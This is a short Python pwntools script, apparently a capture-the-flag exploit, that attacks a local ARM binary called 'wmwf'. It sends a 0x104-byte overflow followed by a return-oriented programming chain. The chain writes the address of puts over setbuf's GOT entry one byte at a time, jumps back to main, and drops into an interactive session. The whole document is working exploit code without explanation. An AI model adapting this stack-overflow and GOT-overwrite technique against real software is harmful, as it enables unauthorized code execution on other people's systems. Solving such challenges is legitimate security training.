from pwn import *
context.arch = 'arm'
context.log_level = 'debug'
pop_r3 = 0x00010390 # pop {r3, pc}
pop_r4 = 0x000104ae+1 # pop {r4, pc}
strb_r3_r4 = 0x000104ac+1 # strb r3, [r4, #0x0] ; pop {r4, pc}

e = ELF('./wmwf')
r = process('./wmwf')
#r = gdb.debug('./wmwf', 'b main\nc')
payload = b'a'*0x104 
for i in range(0, 4):
    payload += p32(pop_r3) + p32(p32(e.plt['puts'])[i])
    payload += p32(pop_r4) + p32(e.got['setbuf']+i)
    payload += p32(strb_r3_r4) + p32(0)
    payload += p32(e.sym['main'])
r.sendline(payload)
r.interactive()

